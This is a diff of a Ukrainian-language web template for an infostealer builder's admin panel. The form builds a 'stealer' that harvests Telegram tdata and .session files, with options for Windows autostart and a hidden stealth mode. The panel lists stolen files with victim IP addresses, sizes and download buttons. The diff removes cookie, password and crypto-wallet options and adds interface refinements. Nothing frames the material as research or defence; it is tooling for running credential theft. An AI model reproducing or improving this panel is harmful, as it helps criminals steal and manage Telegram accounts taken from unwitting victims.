@@ -36,58 +36,50 @@
                     </div>
                     
                     <div class="mb-3">
-                        <label class="form-label">Функції збору:</label>
+                        <label class="form-label"><strong>Функції збору:</strong></label>
                         <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="features" value="tdata" checked>
-                            <label class="form-check-label">
-                                <strong>Telegram tdata</strong> - папки з сесіями
+                            <input class="form-check-input" type="checkbox" name="features" value="tdata" id="tdataCheck" checked>
+                            <label class="form-check-label" for="tdataCheck">
+                                <strong>Telegram tdata</strong> - папки з сесіями (D877, map, key_datas)
                             </label>
                         </div>
                         <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="features" value="sessions" checked>
-                            <label class="form-check-label">
+                            <input class="form-check-input" type="checkbox" name="features" value="sessions" id="sessionsCheck" checked>
+                            <label class="form-check-label" for="sessionsCheck">
                                 <strong>Session файли</strong> - .session, .session-journal
-                            </label>
-                        </div>
-                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="features" value="cookies">
-                            <label class="form-check-label">
-                                Cookies браузерів
-                            </label>
-                        </div>
-                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="features" value="passwords">
-                            <label class="form-check-label">
-                                Збережені паролі
-                            </label>
-                        </div>
-                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="features" value="crypto">
-                            <label class="form-check-label">
-                                Крипто-гаманці
                             </label>
                         </div>
                     </div>
                     
                     <div class="mb-3">
-                        <label class="form-label">Додаткові налаштування:</label>
-                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="auto_start" checked>
-                            <label class="form-check-label">Автозапуск при старті системи</label>
+                        <label class="form-label"><strong>Додаткові налаштування:</strong></label>
+                        <div class="form-check form-switch">
+                            <input class="form-check-input" type="checkbox" name="auto_start" id="autoStartCheck" checked>
+                            <label class="form-check-label" for="autoStartCheck">
+                                <strong>Автозапуск при старті системи</strong> - додає в автозавантаження Windows
+                            </label>
                         </div>
-                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="hide_process" checked>
-                            <label class="form-check-label">Приховати процес</label>
-                        </div>
-                        <div class="form-check">
-                            <input class="form-check-input" type="checkbox" name="persistence">
-                            <label class="form-check-label">Постійність (persistence)</label>
+                        <div class="form-check form-switch">
+                            <input class="form-check-input" type="checkbox" name="hide_process" id="hideProcessCheck" checked>
+                            <label class="form-check-label" for="hideProcessCheck">
+                                <strong>Приховати процес</strong> - запускає без консолі (стелс-режим)
+                            </label>
                         </div>
                     </div>
                     
                     <button type="submit" class="btn btn-success w-100" id="buildBtn">
                         <i class="fas fa-hammer"></i> Збудувати стіллер
                     </button>
+                    
+                    <div class="mt-3 p-3 bg-light rounded">
+                        <small class="text-muted">
+                            <strong>Інформація про збірку:</strong><br>
+                            • <strong>Tdata</strong> - збирає основні файли сесій Telegram Desktop<br>
+                            • <strong>Session файли</strong> - збирає файли .session та .session-journal<br>
+                            • <strong>Автозапуск</strong> - додає стіллер в автозавантаження Windows<br>
+                            • <strong>Стелс-режим</strong> - запускає без вікна консолі
+                        </small>
+                    </div>
                 </form>
             </div>
         </div>
@@ -97,7 +89,12 @@
         <div class="card">
             <div class="card-header d-flex justify-content-between align-items-center">
                 <h5>Вкрадені файли</h5>
-                <span class="badge bg-primary">Адмін: {{ current_user.username }}</span>
+                <div>
+                    <button class="btn btn-sm btn-outline-danger" onclick="stealerManager.deleteAllFiles()" 
+                            {% if not stolen_files %}disabled{% endif %}>
+                        <i class="fas fa-trash"></i> Видалити всі
+                    </button>
+                </div>
             </div>
             <div class="card-body">
                 <div class="mb-3">
@@ -110,38 +107,54 @@
                 </div>
                 
                 <!-- Список файлів -->
-                <div class="list-group" style="max-height: 300px; overflow-y: auto;">
+                <div class="list-group" style="max-height: 400px; overflow-y: auto;">
                     {% if stolen_files %}
                         {% for file in stolen_files %}
                         <div class="list-group-item">
-                            <div class="d-flex w-100 justify-content-between">
-                                <!-- ВИПРАВЛЕНА ЛІНІЯ - заміни basename фільтр -->
-                                <h6 class="mb-1">{{ file.file_path.split('/')[-1] if '/' in file.file_path else file.file_path.split('\\')[-1] }}</h6>
-                                <small class="text-muted">{{ file.created_at.strftime('%Y-%m-%d %H:%M') }}</small>
+                            <div class="d-flex w-100 justify-content-between align-items-start">
+                                <div class="flex-grow-1">
+                                    <h6 class="mb-1">
+                                        {{ file.file_path.split('/')[-1] if '/' in file.file_path else file.file_path.split('\\')[-1] }}
+                                        {% if not file_exists(file.file_path) %}
+                                            <span class="badge bg-warning ms-2">Файл видалений</span>
+                                        {% endif %}
+                                    </h6>
+                                    <p class="mb-1">
+                                        <span class="badge bg-secondary">{{ file.data_type }}</span>
+                                        <span class="badge bg-info">
+                                            {% if file.file_size > 1024*1024 %}
+                                                {{ "%.2f"|format(file.file_size / (1024*1024)) }} MB
+                                            {% elif file.file_size > 1024 %}
+                                                {{ "%.2f"|format(file.file_size / 1024) }} KB
+                                            {% else %}
+                                                {{ file.file_size }} B
+                                            {% endif %}
+                                        </span>
+                                        <span class="badge bg-light text-dark">{{ file.created_at.strftime('%Y-%m-%d %H:%M') }}</span>
+                                    </p>
+                                    <small class="text-muted">IP: {{ file.ip_address }}</small>
+                                </div>
+                                <div class="btn-group ms-2">
+                                    <button class="btn btn-sm btn-outline-primary" 
+                                            onclick="stealerManager.downloadFile('{{ file.id }}')"
+                                            {% if not file_exists(file.file_path) %}disabled{% endif %}
+                                            title="Завантажити файл">
+                                        <i class="fas fa-download"></i>
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-danger" 
+                                            onclick="stealerManager.deleteFile('{{ file.id }}')"
+                                            title="Видалити файл">
+                                        <i class="fas fa-trash"></i>
+                                    </button>
+                                </div>
                             </div>
-                            <p class="mb-1">
-                                <span class="badge bg-secondary">{{ file.data_type }}</span>
-                                <span class="badge bg-info">
-                                    {% if file.file_size > 1024*1024 %}
-                                        {{ "%.2f"|format(file.file_size / (1024*1024)) }} MB
-                                    {% elif file.file_size > 1024 %}
-                                        {{ "%.2f"|format(file.file_size / 1024) }} KB
-                                    {% else %}
-                                        {{ file.file_size }} B
-                                    {% endif %}
-                                </span>
-                            </p>
-                            <small class="text-muted">IP: {{ file.ip_address }}</small>
                         </div>
                         {% endfor %}
                     {% else %}
-                        <div class="list-group-item">
-                            <div class="d-flex w-100 justify-content-between">
-                                <h6 class="mb-1">Немає отриманих файлів</h6>
-                                <small class="text-muted">---</small>
-                            </div>
-                            <p class="mb-1">Файли будуть відображатися тут після отримання</p>
-                            <small class="text-muted">Статус: Очікування...</small>
+                        <div class="list-group-item text-center text-muted">
+                            <i class="fas fa-inbox fa-2x mb-2"></i>
+                            <p class="mb-1">Немає отриманих файлів</p>
+                            <small>Файли будуть відображатися тут після отримання</small>
                         </div>
                     {% endif %}
                 </div>
@@ -158,7 +171,7 @@
         
         <div class="card mt-4">
             <div class="card-header">
-                <h6>Інформація про стіллер</h6>
+                <h6><i class="fas fa-info-circle"></i> Інформація про стіллер</h6>
             </div>
             <div class="card-body">
                 <small class="text-muted">
@@ -167,6 +180,48 @@
                     <strong>Файли будуть надсилатися на:</strong> цей акаунт адміна<br>
                     <strong>Шлях зберігання:</strong> uploads/stolen_files/{{ session.admin_id }}/
                 </small>
+                
+                <hr>
+                
+                <div class="mt-2">
+                    <strong>Останні дії:</strong>
+                    <div id="recentActivity">
+                        {% if stolen_files %}
+                            <small class="text-success">
+                                <i class="fas fa-check-circle"></i> Останній файл отримано: {{ stolen_files[0].created_at.strftime('%d.%m.%Y %H:%M') }}
+                            </small>
+                        {% else %}
+                            <small class="text-muted">
+                                <i class="fas fa-clock"></i> Очікування отримання файлів...
+                            </small>
+                        {% endif %}
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Модальне вікно для інформації про збірку -->
+<div class="modal fade" id="buildInfoModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Інформація про збірку</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <p><strong>Обрані функції збору:</strong></p>
+                <ul id="selectedFeaturesList">
+                    <!-- Буде заповнено JavaScript -->
+                </ul>
+                <p><strong>Додаткові налаштування:</strong></p>
+                <ul id="selectedSettingsList">
+                    <!-- Буде заповнено JavaScript -->
+                </ul>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Закрити</button>
             </div>
         </div>
     </div>
@@ -175,4 +230,68 @@
 
 {% block scripts %}
 <script src="{{ url_for('static', filename='js/stealer.js') }}"></script>
+
+<script>
+// Додатковий JavaScript для форми
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('stealerForm');
+    const buildBtn = document.getElementById('buildBtn');
+    
+    // Інформація про вибір перед відправкою
+    form.addEventListener('submit', function(e) {
+        const features = [];
+        const settings = [];
+        
+        // Збираємо обрані функції
+        if (document.getElementById('tdataCheck').checked) {
+            features.push('Telegram tdata');
+        }
+        if (document.getElementById('sessionsCheck').checked) {
+            features.push('Session файли');
+        }
+        
+        // Збираємо додаткові налаштування
+        if (document.getElementById('autoStartCheck').checked) {
+            settings.push('Автозапуск при старті системи');
+        }
+        if (document.getElementById('hideProcessCheck').checked) {
+            settings.push('Прихований процес (стелс-режим)');
+        }
+        
+        // Показуємо інформацію
+        if (features.length === 0) {
+            e.preventDefault();
+            alert('⚠️ Будь ласка, оберіть хоча б одну функцію збору!');
+            return;
+        }
+        
+        // Оновлюємо модальне вікно
+        const featuresList = document.getElementById('selectedFeaturesList');
+        const settingsList = document.getElementById('selectedSettingsList');
+        
+        featuresList.innerHTML = features.map(f => `<li>${f}</li>`).join('');
+        settingsList.innerHTML = settings.length > 0 
+            ? settings.map(s => `<li>${s}</li>`).join('')
+            : '<li>Немає додаткових налаштувань</li>';
+        
+        // Показуємо модальне вікно
+        const modal = new bootstrap.Modal(document.getElementById('buildInfoModal'));
+        modal.show();
+        
+        // Продовжуємо відправку форми після закриття модального вікна
+        document.getElementById('buildInfoModal').addEventListener('hidden.bs.modal', function () {
+            // Форма продовжить відправку автоматично
+        });
+    });
+    
+    // Перевірка хоча б однієї функції
+    const checkboxes = document.querySelectorAll('input[name="features"]');
+    checkboxes.forEach(checkbox => {
+        checkbox.addEventListener('change', function() {
+            const checkedFeatures = document.querySelectorAll('input[name="features"]:checked');
+            buildBtn.disabled = checkedFeatures.length === 0;
+        });
+    });
+});
+</script>
 {% endblock %}
